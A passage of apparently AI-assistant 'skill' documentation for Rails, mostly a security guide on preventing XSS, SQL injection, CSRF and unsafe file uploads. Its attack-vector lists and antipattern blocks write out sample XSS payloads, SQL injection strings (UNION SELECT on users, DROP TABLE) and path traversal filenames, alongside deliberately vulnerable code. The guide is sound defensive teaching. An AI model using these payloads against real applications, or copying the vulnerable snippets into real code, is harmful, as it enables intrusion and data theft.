`fetch` (raises explicit errors)\n\n**Example violations:**\n\n```ruby\n# ❌ VIOLATION: Unsafe nested bracket access\nuser[:profile][:theme][:color]        # NoMethodError if :profile is nil\ndata[:metadata][:created_at][:date]   # NoMethodError if :metadata is nil\n\n# ✅ CORRECT: Safe nested access with dig\nuser.dig(:profile, :theme, :color)    # Returns nil safely\ndata.dig(:metadata, :created_at, :date)\n\n# ✅ ALTERNATIVE: Explicit error handling with fetch\nuser.fetch(:profile).fetch(:theme).fetch(:color)  # Raises KeyError with clear message\n\n```\n\n**Enable in .rubocop.yml:**\n\n```yaml\n# .rubocop.yml\ninherit_gem: { rubocop-rails-omakase: rubocop.yml }\n\n# Load custom cops\nrequire:\n  - ./lib/rails_ai/cops/style/nested_bracket_access.rb\n\n# Team overrides\nStyle/StringLiterals:\n  EnforcedStyle: double_quotes\n\nStyle/HashFetchChain:\n  Enabled: true\n\nStyle/DigChain:\n  Enabled: true\n\n# Custom cop configuration\nStyle/NestedBracketAccess:\n  Enabled: true\n  Severity: warning  # Warn only, don't fail CI yet\n  Description: 'Detects nested hash bracket access and suggests Hash#dig'\n\n```\n</pattern>\n\n<antipatterns>\n<antipattern>\n<description>Replace rubocop-rails-omakase entirely</description>\n<reason>Lose Rails defaults, have to maintain everything yourself</reason>\n<bad-example>\n\n```yaml\n# BAD: Throwing away Rails defaults\n# inherit_gem: { rubocop-rails-omakase: rubocop.yml }\n\nplugins:\n  - rubocop-minitest\n  - rubocop-rake\n\nAllCops:\n  NewCops: enable\n  # ... 200 lines of custom configuration\n\n```\n</bad-example>\n<good-example>\n\n```yaml\n# GOOD: Build on Rails defaults\ninherit_gem: { rubocop-rails-omakase: rubocop.yml }\n\n# Only override team-specific rules\nStyle/StringLiterals:\n  EnforcedStyle: double_quotes\n\n```\n</good-example>\n</antipattern>\n\n<antipattern>\n<description>Skip RuboCop in CI</description>\n<reason>Violations slip into codebase, inconsistent style</reason>\n<bad-example>\n\n```bash\n# BAD: bin/ci without RuboCop\n#!/usr/bin/env bash\nbin/rails test  # Missing RuboCop check!\n\n```\n</bad-example>\n<good-example>\n\n```bash\n#!/usr/bin/env bash\nset -e\nbin/rails test\nbin/rubocop      # ✅ Included\nbin/brakeman -q\n\n```\n</good-example>\n</antipattern>\n</antipatterns>\n\n---\n\n## CI/CD Integration\n\nIntegrate configuration checks into continuous integration pipelines.\n\n### GitHub Actions\n\n<pattern name=\"cicd-github-actions\">\n<description>Configure CI/CD to access encrypted credentials</description>\n\n**GitHub Actions:**\n\n```yaml\n# .github/workflows/ci.yml\njobs:\n  test:\n    env:\n      RAILS_MASTER_KEY: ${{ secrets.RAILS_MASTER_KEY }}\n    steps:\n      - uses: actions/checkout@v4\n      - uses: ruby/setup-ruby@v1\n      - run: bin/ci\n\n```\n\n**Setup:** Settings > Secrets > Actions > Add `RAILS_MASTER_KEY`\n</pattern>\n\n---\n\n<testing>\n\n```ruby\n# test/config/credentials_test.rb\nclass CredentialsTest < ActiveSupport::TestCase\n  test \"credentials are accessible\" do\n    assert Rails.application.credentials.secret_key_base.present?\n    assert Rails.application.credentials.dig(:stripe, :secret_key).present?\n  end\nend\n\n```\n</testing>\n\n<related-skills>\n**Must use during project verification:**\n- rails-ai:jobs - SolidQueue, SolidCache, SolidCable requirements (TEAM RULE #1)\n- rails-ai:testing - Minitest patterns and anti-patterns (TEAM RULE #2)\n- rails-ai:security - Security configuration, credentials, SSL, CSP (TEAM RULE #13)\n- rails-ai:styling - Tailwind CSS and DaisyUI configuration\n\n**May use for specific checks:**\n- rails-ai:models - Database configuration and migrations\n- rails-ai:debugging - Rails debugging tools and logging configuration\n- rails-ai:controllers - RESTful routing verification (TEAM RULE #3)\n</related-skills>\n\n<resources>\n\n**Official Documentation:**\n- [Rails Guides - Configuring Rails Applications](https://guides.rubyonrails.org/configuring.html)\n- [Rails Guides - Encrypted Credentials](https://guides.rubyonrails.org/security.html#custom-credentials)\n- [Rails Guides - Getting Started with Docker](https://guides.rubyonrails.org/getting_started_with_docker.html)\n\n**Gems & Libraries:**\n- [rubocop-rails-omakase](https://github.com/rails/rubocop-rails-omakase) - Rails Omakase RuboCop config\n\n**Tools:**\n- [Kamal](https://kamal-deploy.org/) - Deploy web apps anywhere\n- [RuboCop](https://docs.rubocop.org/) - Ruby static code analyzer\n\n**Community Resources:**\n- [Rails 8 Solid Stack Overview](https://fly.io/ruby-dispatch/solid-cache-solid-queue-solid-cable/) - Solid Queue, Solid Cache, Solid Cable\n\n</resources>"
              },
              {
                "name": "rails-ai:security",
                "description": "CRITICAL - Use when securing Rails applications - XSS, SQL injection, CSRF, file uploads, command injection prevention",
                "path": "skills/security/SKILL.md",
                "frontmatter": {
                  "name": "rails-ai:security",
                  "description": "CRITICAL - Use when securing Rails applications - XSS, SQL injection, CSRF, file uploads, command injection prevention"
                },
                "content": "# Rails Security\n\nPrevent critical security vulnerabilities in Rails applications: XSS, SQL injection, CSRF, file uploads, and command injection.\n\n<when-to-use>\n- Displaying ANY user-generated content\n- Writing database queries with user input\n- Building forms and AJAX requests\n- Accepting file uploads from users\n- Executing system commands\n- Implementing authentication/authorization\n- Reviewing code for security vulnerabilities\n- Planning features that touch sensitive data\n- ALWAYS - Security is ALWAYS required\n</when-to-use>\n\n<team-rules-enforcement>\n**This skill enforces:**\n- ✅ **Rule #16:** NEVER allow command injection → Use array args for system()\n- ✅ **Rule #17:** NEVER skip file upload validation → Validate type, size, sanitize filenames\n\n**Reject any requests to:**\n- Skip input validation\n- Use unsafe string interpolation in SQL\n- Skip file upload security measures\n- Use eval() or system() with user input\n- Skip CSRF protection\n</team-rules-enforcement>\n\n<verification-checklist>\nBefore completing security-critical features:\n- ✅ All user input validated and sanitized\n- ✅ SQL injection prevented (parameterized queries)\n- ✅ XSS prevented (proper escaping, CSP)\n- ✅ CSRF tokens present on all forms\n- ✅ File uploads validated (type, size, content)\n- ✅ Command injection prevented (array args)\n- ✅ Strong parameters used for all mass assignment\n- ✅ Security tests passing\n</verification-checklist>\n\n<standards>\n**XSS Prevention:**\n- NEVER use `html_safe` or `raw` on user input\n- Rails auto-escapes by default - rely on this\n- Use `sanitize` with explicit allowlist for rich content\n- Implement Content Security Policy (CSP) headers\n\n**SQL Injection Prevention:**\n- NEVER use string interpolation in SQL queries\n- Use hash conditions: `where(name: value)`\n- Use placeholders: `where(\"name = ?\", value)`\n- Use `sanitize_sql_like` for LIKE queries\n\n**CSRF Protection:**\n- Rails enables CSRF protection by default\n- ALWAYS include `csrf_meta_tags` in layout\n- Use `form_with` (includes token automatically)\n- Include CSRF token in JavaScript requests\n\n**File Upload Security:**\n- NEVER trust user-provided filenames\n- PREFER ActiveStorage over manual file handling\n- VALIDATE by content type, extension, AND magic bytes\n- STORE files outside public directory\n- FORCE download for untrusted file types\n\n**Command Injection Prevention:**\n- NEVER interpolate user input in system commands\n- ALWAYS use array form: `system(\"cmd\", arg1, arg2)`\n- PREFER Ruby methods over shell commands\n- VALIDATE input with strict allowlists\n</standards>\n\n## XSS (Cross-Site Scripting) Prevention\n\n<attack-vectors>\n- **Script Injection** - `<script>alert('XSS')</script>`\n- **Event Handlers** - `<img src=x onerror=\"alert('XSS')\">`\n- **JavaScript URLs** - `<a href=\"javascript:alert('XSS')\">Click</a>`\n- **SVG Injection** - `<svg onload=\"alert('XSS')\"></svg>`\n- **Data URIs** - `<img src=\"data:text/html,<script>alert('XSS')</script>\">`\n</attack-vectors>\n\n### Rails Auto-Escaping\n\n<pattern name=\"default-protection\">\n<description>Rails automatically escapes output in ERB templates</description>\n\n```erb\n<%# SECURE - Rails auto-escapes %>\n<div class=\"content\">\n  <%= @feedback.content %>\n</div>\n\n```\n\n**Attack Input:** `<script>alert('XSS')</script>`\n\n**Safe Output:** `&lt;script&gt;alert('XSS')&lt;/script&gt;`\n\nBrowser displays the text, doesn't execute it.\n</pattern>\n\n### Sanitizing User Content\n\n<pattern name=\"sanitize-with-allowlist\">\n<description>Allow specific HTML tags while stripping dangerous content</description>\n\n```erb\n<%# Allow only specific tags %>\n<%= sanitize(@feedback.content,\n    tags: %w[p br strong em a ul ol li],\n    attributes: %w[href title]) %>\n\n```\n\n**Input:** `<p>Hello <strong>world</strong></p><script>alert('XSS')</script>`\n\n**Output:** `<p>Hello <strong>world</strong></p>` (script stripped)\n</pattern>\n\n### Content Security Policy\n\n<pattern name=\"csp-configuration\">\n<description>Implement Content Security Policy to block inline scripts</description>\n\n```ruby\n# config/initializers/content_security_policy.rb\nRails.application.config.content_security_policy do |policy|\n  policy.default_src :self, :https\n  policy.font_src :self, :https, :data\n  policy.img_src :self, :https, :data\n  policy.frame_ancestors :none\n  policy.object_src :none\n  policy.script_src :self, :https\n  policy.style_src :self, :https\n  policy.report_uri \"/csp-violation-report\"\nend\n\nRails.application.config.content_security_policy_nonce_generator = ->(request) {\n  SecureRandom.base64(16)\n}\nRails.application.config.content_security_policy_nonce_directives = %w[script-src]\n\n```\n\n**View with Nonce:**\n\n```erb\n<%= javascript_tag nonce: true do %>\n  console.log('This is allowed');\n<% end %>\n\n```\n\n**CSP Violation Reporting:**\n\n```ruby\n# app/controllers/csp_reports_controller.rb\nclass CspReportsController < ApplicationController\n  skip_before_action :verify_authenticity_token\n\n  def create\n    violation = JSON.parse(request.body.read)[\"csp-report\"]\n    Rails.logger.warn(\n      \"CSP Violation: document-uri=#{violation['document-uri']} \" \\\n      \"blocked-uri=#{violation['blocked-uri']}\"\n    )\n    head :no_content\n  end\nend\n\n```\n\n**Why CSP:** Blocks XSS even if malicious script reaches the page, defense-in-depth strategy.\n</pattern>\n\n### ViewComponent Safety\n\n<pattern name=\"viewcomponent-escaping\">\n<description>ViewComponents automatically escape content</description>\n\n```ruby\n# app/components/user_comment_component.rb\nclass UserCommentComponent < ViewComponent::Base\n  def initialize(comment:)\n    @comment = comment\n  end\n\n  private\n  attr_reader :comment\nend\n\n```\n\n```erb\n<%# app/components/user_comment_component.html.erb %>\n<div class=\"comment\">\n  <div class=\"author\"><%= comment.author_name %></div>\n  <div class=\"content\"><%= comment.content %></div>\n</div>\n\n```\n\n**Benefits:** Automatic escaping, encapsulated logic, testable, no accidental `html_safe`.\n</pattern>\n\n### Markdown Rendering\n\n<pattern name=\"markdown-safe-rendering\">\n<description>Safely render markdown user content</description>\n\n```ruby\n# app/models/feedback.rb\nclass Feedback < ApplicationRecord\n  def content_html\n    markdown = Redcarpet::Markdown.new(\n      Redcarpet::Render::HTML.new(\n        filter_html: true, no_styles: true, safe_links_only: true\n      ),\n      autolink: true, tables: true, fenced_code_blocks: true\n    )\n\n    html = markdown.render(content)\n    ActionController::Base.helpers.sanitize(\n      html,\n      tags: %w[p br strong em a ul ol li pre code h1 h2 h3 blockquote],\n      attributes: %w[href title]\n    )\n  end\nend\n\n```\n\n**View:**\n\n```erb\n<div class=\"markdown-content\">\n  <%= @feedback.content_html.html_safe %>\n</div>\n\n```\n\n**Why Safe:** Markdown filtered for HTML, output sanitized with allowlist, double protection layer.\n</pattern>\n\n<antipattern>\n<description>Using html_safe on user input</description>\n<reason>Allows malicious script execution - CRITICAL vulnerability</reason>\n\n<bad-example>\n\n```erb\n<%# CRITICAL VULNERABILITY %>\n<%= @comment.html_safe %>\n<%= raw(@feedback.content) %>\n\n```\n</bad-example>\n\n<good-example>\n\n```erb\n<%# SECURE - Auto-escaped or sanitized %>\n<%= @comment %>\n<%= sanitize(@feedback.content, tags: %w[p br strong em]) %>\n\n```\n</good-example>\n</antipattern>\n\n## SQL Injection Prevention\n\n<attack-vectors>\n- **Authentication Bypass** - `' OR '1'='1`\n- **Data Theft** - `' UNION SELECT * FROM users --`\n- **Data Modification** - `'; UPDATE users SET admin=true --`\n- **Data Deletion** - `'; DROP TABLE users --`\n</attack-vectors>\n\n### Secure Query Patterns\n\n<pattern name=\"hash-conditions\">\n<description>Use hash conditions for simple equality checks (RECOMMENDED)</description>\n\n```ruby\n# ✅ SECURE - ActiveRecord escapes automatically\nProject.where(name: params[:name])\nUser.find_by(login: params[:login])\n\n# ✅ SECURE - Multiple conditions\nProject.where(name: params[:name], status: params[:status], user_id: current_user.id)\n\n# ✅ SECURE - IN queries (works with arrays)\nProject.where(id: params[:ids])\n\n```\n\n**Why Secure:** ActiveRecord automatically escapes values and prevents injection.\n</pattern>\n\n<pattern name=\"positional-placeholders\">\n<description>Use ? placeholders for complex queries</description>\n\n```ruby\n# ✅ SECURE - Single placeholder\nProject.where(\"name = ?\", params[:name])\nProject.where(\"created_at > ?\", 1.week.ago)\n\n# ✅ SECURE - Multiple placeholders\nUser.where(\"login = ? AND status = ? AND created_at > ?\",\n  params[:login], \"active\", 1.month.ago)\n\n# ✅ SECURE - Complex conditions\nFeedback.where(\"status = ? AND (priority = ? OR created_at < ?)\",\n  params[:status], \"high\", 1.day.ago)\n\n```\n\n**Why Secure:** Rails escapes each parameter value, preventing injection.\n</pattern>\n\n<pattern name=\"like-queries-safe\">\n<description>Safely handle LIKE queries with wildcards</description>\n\n```ruby\n# ✅ SECURE - Escape special LIKE characters (% -> \\%, _ -> \\_)\nsearch_term = Book.sanitize_sql_like(params[:title])\nBook.where(\"title LIKE ?\", \"#{search_term}%\")\n\n# ✅ SECURE - Case-insensitive search\nsearch_term = Book.sanitize_sql_like(params[:query])\nBook.where(\"LOWER(title) LIKE LOWER(?)\", \"%#{search_term}%\")\n\n```\n\n**Why Sanitize:** Without `sanitize_sql_like`, users could inject `%` or `_` wildcards.\n</pattern>\n\n<antipattern>\n<description>Using string interpolation in queries</description>\n<reason>CRITICAL - Allows arbitrary SQL injection</reason>\n\n<bad-example>\n\n```ruby\n# ❌ CRITICAL VULNERABILITY\nProject.where(\"name = '#{params[:name]}'\")\n# Attack: params[:name] = \"' OR '1'='1\" - Returns ALL projects\n\nUser.find_by(\"login = '#{params[:login]}' AND password = '#{params[:password]}'\")\n# Attack: params[:login] = \"admin'--\" - Bypasses password check\n\n# ❌ CRITICAL - Data exfiltration\nProject.where(\"id = #{params[:id]}\")\n# Attack: params[:id] = \"1 UNION SELECT id,email,password,1,1 FROM users\"\n\n```\n</bad-example>\n\n<good-example>\n\n```ruby\n# ✅ SECURE - Use placeholders\nProject.where(\"name = ?\", params[:name])\nUser.find_by(\"login = ? AND password = ?\", params[:login], params[:password])\n\n# ✅ BETTER - Use hash conditions\nProject.where(name: params[:name])\nUser.find_by(login: params[:login], password: params[:password])\n\n# ✅ SECURE - Type conversion prevents injection\nProject.where(id: params[:id].to_i)\n\n```\n</good-example>\n</antipattern>\n\n### Dynamic ORDER BY Clauses\n\n<pattern name=\"order-by-allowlist\">\n<description>Safely build ORDER BY from user input with allowlist</description>\n\n```ruby\n# ✅ SECURE - Allowlist approach\nALLOWED_SORT_COLUMNS = %w[name created_at status priority].freeze\nALLOWED_DIRECTIONS = %w[ASC DESC].freeze\n\ndef index\n  column = ALLOWED_SORT_COLUMNS.include?(params[:sort]) ? params[:sort] : \"created_at\"\n  direction = ALLOWED_DIRECTIONS.include?(params[:direction]&.upcase) ? params[:direction] : \"DESC\"\n\n  @projects = Project.order(\"#{column} #{direction}\")\nend\n\n```\n\n**Why Secure:** User input limited to predefined safe values, SQL injection impossible.\n</pattern>\n\n<antipattern>\n<description>Building ORDER BY from user input</description>\n<reason>Allows column enumeration and SQL injection</reason>\n\n<bad-example>\n\n```ruby\n# ❌ VULNERABLE\nProject.order(\"#{params[:sort]} #{params[:direction]}\")\n# Attack: params[:sort] = \"name); DROP TABLE projects; --\"\n\n```\n</bad-example>\n\n<good-example>\n\n```ruby\n# ✅ SECURE - Allowlist only\nallowed = %w[name created_at]\ncolumn = allowed.include?(params[:sort]) ? params[:sort] : \"created_at\"\nProject.order(column)\n\n```\n</good-example>\n</antipattern>\n\n### ActiveRecord Query Methods\n\n<pattern name=\"activerecord-query-methods\">\n<description>Use ActiveRecord methods for automatic protection</description>\n\n```ruby\n# ✅ SECURE - All ActiveRecord methods are safe\nProject.find(params[:id])\nProject.find_by(name: params[:name])\nProject.where(status: params[:status])\nProject.order(:created_at)\nProject.limit(10)\nProject.offset(params[:page].to_i * 10)\nProject.joins(:user)\nProject.includes(:comments)\nProject.group(:category)\nProject.having(\"COUNT(*) > ?\", 5)\n\n# ✅ SECURE - Scopes\nclass Project < ApplicationRecord\n  scope :active, -> { where(status: \"active\") }\n  scope :by_user, ->(user_id) { where(user_id: user_id) }\n  scope :search, ->(term) {\n    sanitized = sanitize_sql_like(term)\n    where(\"name LIKE ?\", \"%#{sanitized}%\")\n  }\nend\n\nProject.active.by_user(params[:user_id]).search(params[:query])\n\n```\n\n**Why Secure:** ActiveRecord automatically escapes all parameters.\n</pattern>\n\n## CSRF (Cross-Site Request Forgery) Protection\n\n<attack-vectors>\n- **Hidden Form Attack** - Malicious site auto-submits form to your app\n- **Image Tag Attack** - `<img src=\"https://yourapp.com/account/delete\">`\n- **AJAX Attack** - JavaScript fetch/XHR to your endpoints\n- **Auto-Submit Form** - JavaScript automatically submits hidden form\n</attack-vectors>\n\n### Rails Default Protection\n\n<pattern name=\"default-csrf-protection\">\n<description>Rails enables CSRF protection by default</description>\n\n```ruby\n# app/controllers/application_controller.rb\nclass ApplicationController < ActionController::Base\n  protect_from_forgery with: :exception\n  # Raises ActionController::InvalidAuthenticityToken if token invalid\nend\n\n```\n\n**Why :exception is Best:** Makes failures visible, prevents silent bypasses, forces proper error handling.\n</pattern>\n\n### Form Protection\n\n<pattern name=\"automatic-token-in-forms\">\n<description>form_with automatically includes CSRF token</description>\n\n```erb\n<%# ✅ SECURE - Token included automatically %>\n<%= form_with model: @feedback do |form| %>\n  <%= form.text_field :content %>\n  <%= form.text_field :recipient_email %>\n  <%= form.submit \"Submit\" %>\n<% end %>\n\n```\n\n**Generated HTML:**\n\n```html\n<form action=\"/feedbacks\" method=\"post\">\n  <input type=\"hidden\" name=\"authenticity_token\" value=\"SECURE_TOKEN\">\n  <input type=\"text\" name=\"feedback[content]\">\n  <input type=\"submit\" value=\"Submit\">\n</form>\n\n```\n\n**Why Secure:** Rails validates token matches session.\n</pattern>\n\n### JavaScript Protection\n\n<pattern name=\"csrf-meta-tags\">\n<description>Include CSRF meta tags for JavaScript access</description>\n\n```erb\n<%# app/views/layouts/application.html.erb %>\n<head>\n  <title>My App</title>\n  <%= csrf_meta_tags %>\n</head>\n\n```\n</pattern>\n\n<pattern name=\"fetch-with-csrf-token\">\n<description>Include CSRF token in fetch requests</description>\n\n```javascript\n// ✅ SECURE - Extract token from meta tag\nconst csrfToken = document.head.querySelector(\"meta[name=csrf-token]\")?.content;\n\nfetch(\"/feedbacks\", {\n  method: \"POST\",\n  headers: {\n    \"Content-Type\": \"application/json\",\n    \"X-CSRF-Token\": csrfToken\n  },\n  body: JSON.stringify({\n    feedback: { content: \"test\", recipient_email: \"user@example.com\" }\n  })\n});\n\n```\n\n**Why Secure:** Rails checks `X-CSRF-Token` header matches session token.\n</pattern>\n\n<antipattern>\n<description>Skipping CSRF for session-based authentication</description>\n<reason>CRITICAL - Allows attackers to perform actions as authenticated users</reason>\n\n<bad-example>\n\n```ruby\n# ❌ CRITICAL VULNERABILITY\nclass FeedbacksController < ApplicationController\n  skip_before_action :verify_authenticity_token\n\n  def create\n    @feedback = current_user.feedbacks.create!(feedback_params)\n    redirect_to @feedback\n  end\nend\n\n```\n</bad-example>\n\n<good-example>\n\n```ruby\n# ✅ SECURE - Keep CSRF protection enabled\nclass FeedbacksController < ApplicationController\n  # protect_from_forgery inherited from ApplicationController\n\n  def create\n    @feedback = current_user.feedbacks.create!(feedback_params)\n    redirect_to @feedback\n  end\nend\n\n```\n</good-example>\n</antipattern>\n\n### Rails Request.js Library\n\n<pattern name=\"rails-request-js\">\n<description>Use @rails/request.js for automatic CSRF handling</description>\n\n**Installation:**\n\n```bash\nnpm install @rails/request.js\n\n```\n\n**Usage:**\n\n```javascript\n// ✅ SECURE - Token automatically included\nimport { post, patch, destroy } from '@rails/request.js'\n\nawait post('/feedbacks', {\n  body: JSON.stringify({ feedback: { content: \"test\" } }),\n  contentType: 'application/json',\n  responseKind: 'json'\n})\n\nawait patch('/feedbacks/123', {\n  body: JSON.stringify({ feedback: { status: \"reviewed\" } })\n})\n\nawait destroy('/feedbacks/123', { responseKind: 'json' })\n\n```\n\n**Why Recommended:** Automatic CSRF token handling, consistent API, Rails-aware error handling.\n</pattern>\n\n### API Endpoints\n\n<pattern name=\"api-skip-csrf\">\n<description>Skip CSRF for stateless API endpoints with token auth</description>\n\n```ruby\n# app/controllers/api/v1/base_controller.rb\nclass Api::V1::BaseController < ApplicationController\n  skip_before_action :verify_authenticity_token\n  before_action :authenticate_api_token\n\n  private\n\n  def authenticate_api_token\n    token = request.headers[\"Authorization\"]&.split(\" \")&.last\n    @current_api_user = User.find_by(api_token: token)\n    head :unauthorized unless @current_api_user\n  end\nend\n\n```\n\n**Why Skip CSRF for APIs:** API clients use Bearer tokens (not cookies), tokens must be explicitly sent, CSRF only affects cookie-based authentication.\n</pattern>\n\n### Error Handling\n\n<pattern name=\"graceful-csrf-failure\">\n<description>Handle CSRF failures with user-friendly error messages</description>\n\n```ruby\n# app/controllers/application_controller.rb\nclass ApplicationController < ActionController::Base\n  protect_from_forgery with: :exception\n\n  rescue_from ActionController::InvalidAuthenticityToken do |exception|\n    Rails.logger.warn(\n      \"CSRF failure: #{exception.message} IP: #{request.remote_ip} Path: #{request.fullpath}\"\n    )\n\n    sign_out_user if user_signed_in?\n    redirect_to root_path, alert: \"Your session has expired. Please log in again.\"\n  end\n\n  private\n\n  def sign_out_user\n    cookies.delete(:user_token)\n    reset_session\n  end\nend\n\n```\n\n**Why Important:** Users see helpful error, security events logged, stale sessions cleared.\n</pattern>\n\n### SameSite Cookies\n\n<pattern name=\"samesite-cookies\">\n<description>Use SameSite cookie attribute for defense-in-depth</description>\n\n```ruby\n# config/initializers/session_store.rb\nRails.application.config.session_store :cookie_store,\n  key: '_myapp_session',\n  same_site: :lax,                    # Prevents CSRF from external sites\n  secure: Rails.env.production?,      # HTTPS only in production\n  httponly: true,                     # Not accessible via JavaScript\n  expire_after: 24.hours\n\n```\n\n**SameSite Options:**\n- `:lax` (RECOMMENDED) - Allows top-level navigation, blocks embedded requests\n- `:strict` - Most secure, blocks ALL cross-site requests (may break OAuth)\n- `:none` - Allows all cross-site requests (requires secure: true)\n\n**Why Use SameSite:** Defense-in-depth complements CSRF tokens, blocks many attacks without token.\n</pattern>\n\n## Secure File Uploads\n\n<attack-vectors>\n- **Path Traversal** - `../../config/database.yml` overwrites config files\n- **Malicious File Types** - `.exe`, `.php`, `.html` files containing malware\n- **Content Type Spoofing** - File claims to be image but is script\n- **Magic Bytes Bypass** - Extension doesn't match actual file type\n- **XSS via SVG** - SVG files containing embedded JavaScript\n- **Denial of Service** - Large files consuming disk/memory\n</attack-vectors>\n\n### ActiveStorage (Recommended)\n\n<pattern name=\"activestorage-basic\">\n<description>Use ActiveStorage for automatic security handling</description>\n\n**Model:**\n\n```ruby\nclass Feedback < ApplicationRecord\n  has_one_attached :screenshot\n  has_many_attached :documents\n\n  validates :screenshot,\n    content_type: [\"image/png\", \"image/jpeg\", \"image/gif\"],\n    size: { less_than: 5.megabytes }\n\n  validates :documents,\n    content_type: [\"application/pdf\", \"text/plain\"],\n    size: { less_than: 10.megabytes }\nend\n\n```\n\n**Controller:**\n\n```ruby\nclass FeedbacksController < ApplicationController\n  def create\n    @feedback = Feedback.new(feedback_params)\n    if @feedback.save\n      redirect_to @feedback, notice: \"Feedback created\"\n    else\n      render :new, status: :unprocessable_entity\n    end\n  end\n\n  private\n\n  def feedback_params\n    params.expect(feedback: [:content, :recipient_email, :screenshot, documents: []])\n  end\nend\n\n```\n\n**View:**\n\n```erb\n<%= form_with model: @feedback do |f| %>\n  <%= f.file_field :screenshot, accept: \"image/*\" %>\n  <%= f.file_field :documents, multiple: true, accept: \".pdf,.txt\" %>\n  <%= f.submit %>\n<% end %>\n\n```\n\n**Why Secure:** Automatic filename sanitization, storage outside public/, signed URLs with expiration.\n</pattern>\n\n### File Type Validation\n\n<pattern name=\"content-type-validation\">\n<description>Validate file types by content type, extension, AND magic bytes</description>\n\n```ruby\nclass Feedback < ApplicationRecord\n  has_one_attached :image\n  validate :acceptable_image\n\n  private\n\n  def acceptable_image\n    return unless image.attached?\n\n    unless image.content_type.in?(%w[image/jpeg image/png image/gif])\n      errors.add(:image, \"must be a JPEG, PNG, or GIF\")\n    end\n\n    unless image.filename.to_s.match?(/\\.(jpe?g|png|gif)\\z/i)\n      errors.add(:image, \"must have a valid extension\")\n    end\n\n    unless valid_image_signature?\n      errors.add(:image, \"file signature doesn't match declared type\")\n    end\n\n    if image.byte_size > 5.megabytes\n      errors.add(:image, \"must be less than 5MB\")\n    end\n  end\n\n  def valid_image_signature?\n    image.open do |file|\n      magic_bytes = file.read(8)\n      return false unless magic_bytes\n      # JPEG: FF D8 FF, PNG: 89 50 4E 47, GIF: 47 49 46 38\n      magic_bytes[0..2] == \"\\xFF\\xD8\\xFF\" ||\n        magic_bytes[0..7] == \"\\x89PNG\\r\\n\\x1A\\n\" ||\n        magic_bytes[0..3] == \"GIF8\"\n    end\n  rescue => e\n    Rails.logger.error(\"Image validation error: #{e.message}\")\n    false\n  end\nend\n\n```\n\n**Why Triple Validation:** Content-Type can be spoofed, extension can be faked, magic bytes verify actual format.\n</pattern>\n\n### Secure File Serving\n\n<pattern name=\"controller-based-serving\">\n<description>Serve files via controller with proper security headers</description>\n\n```ruby\nclass DownloadsController < ApplicationController\n  before_action :authenticate_user!\n\n  def show\n    @feedback = Feedback.find(params[:feedback_id])\n    head :forbidden and return unless can_download?(@feedback)\n\n    @document = @feedback.documents.find(params[:id])\n    send_data @document.download,\n              filename: @document.filename.to_s.gsub(/[^\\w.-]/, \"_\"),\n              type: @document.content_type,\n              disposition: \"attachment\"  # Force download, never inline\n  end\n\n  private\n\n  def can_download?(feedback)\n    feedback.user == current_user || current_user.admin?\n  end\nend\n\n```\n\n**Why Secure:** Authentication + authorization enforced, `Content-Disposition: attachment` prevents XSS.\n</pattern>\n\n### Dangerous File Types\n\n<pattern name=\"dangerous-file-types\">\n<description>Force binary download for dangerous file types</description>\n\n```ruby\n# config/initializers/active_storage.rb\nRails.application.config.active_storage.content_types_to_serve_as_binary.tap do |types|\n  types << \"image/svg+xml\"  # SVG with embedded JavaScript\n  types << \"text/html\" << \"application/xhtml+xml\"  # HTML scripts\n  types << \"text/xml\" << \"application/xml\"  # XML entities\n  types << \"application/javascript\" << \"text/javascript\"\nend\n\nRails.application.config.active_storage.content_types_allowed_inline = %w[\n  image/png image/jpeg image/gif image/bmp image/webp application/pdf\n]\n\n```\n\n**Why Important:** SVG/HTML files can contain JavaScript that executes when viewed, enabling XSS.\n</pattern>\n\n### File Size Limits\n\n<pattern name=\"size-limits\">\n<description>Implement multiple layers of file size protection</description>\n\n**Application-Wide:**\n\n```ruby\n# config/application.rb\nconfig.active_storage.max_file_size = 100.megabytes\n\n```\n\n**Web Server (Nginx):**\n\n```nginx\nclient_max_body_size 100M;\n\n```\n\n**Model-Specific:**\n\n```ruby\nclass Feedback < ApplicationRecord\n  has_one_attached :avatar\n  has_many_attached :photos\n\n  validates :avatar, size: { less_than: 2.megabytes }\n  validates :photos, size: { less_than: 5.megabytes }, limit: { max: 10 }\nend\n\n```\n\n**Why Multiple Layers:** Web server rejects huge uploads early, application-wide limit prevents resource exhaustion, model limits enforce business rules.\n</pattern>\n\n### Virus Scanning\n\n<pattern name=\"virus-scanning-production\">\n<description>Scan uploaded files for malware in production</description>\n\n**Setup:** `gem \"clamby\"` + ClamAV (`apt-get install clamav clamav-daemon`)\n\n```ruby\nclass Feedback < ApplicationRecord\n  has_one_attached :file\n  validate :file_not_infected, if: -> { file.attached? }\n\n  private\n\n  def file_not_infected\n    return unless Rails.env.production?\n    file.open do |temp_file|\n      unless Clamby.safe?(temp_file.path)\n        errors.add(:file, \"contains malware or virus\")\n        Rails.logger.warn(\"Malware detected: user_id=#{user_id}, filename=#{file.filename}\")\n      end\n    end\n  rescue Clamby::ClambyScanError => e\n    Rails.logger.error(\"Virus scan failed: #{e.message}\")\n  end\nend\n\n```\n\n**Why Critical:** Prevent viruses, ransomware, and malware from infecting users or servers.\n</pattern>\n\n### ActiveStorage Variants\n\n<pattern name=\"safe-image-processing\">\n<description>Use ActiveStorage variants for secure image processing</description>\n\n```ruby\nclass Feedback < ApplicationRecord\n  has_one_attached :image\n\n  def thumbnail\n    image.variant(resize_to_limit: [100, 100], format: :png, saver: { quality: 85 })\n  end\n\n  def medium\n    image.variant(resize_to_limit: [400, 400], format: :png)\n  end\nend\n\n```\n\n**View:**\n\n```erb\n<%= image_tag @feedback.thumbnail, alt: \"Feedback screenshot\" %>\n\n```\n\n**Why Secure:** Variants re-encode images (stripping metadata/exploits), format conversion prevents attacks.\n</pattern>\n\n<antipattern>\n<description>Trusting user-provided filenames</description>\n<reason>CRITICAL - Enables path traversal and file overwrite attacks</reason>\n\n<bad-example>\n\n```ruby\n# ❌ CRITICAL VULNERABILITY\ndef upload\n  filename = params[:file].original_filename\n  File.open(\"uploads/#{filename}\", \"wb\") { |f| f.write(params[:file].read) }\nend\n# Attack: filename = \"../../config/database.yml\" - Overwrites database config!\n\n# ❌ CRITICAL - Serving from public directory\npath = Rails.root.join(\"public/uploads/#{params[:file].original_filename}\")\nFile.open(path, \"wb\") { |f| f.write(params[:file].read) }\n# Attacker uploads malicious.html with <script> - XSS attack!\n\n```\n</bad-example>\n\n<good-example>\n\n```ruby\n# ✅ SECURE - Use ActiveStorage\nclass Feedback < ApplicationRecord\n  has_one_attached :file\nend\n\n# ✅ SECURE - Manual handling with sanitization\ndef 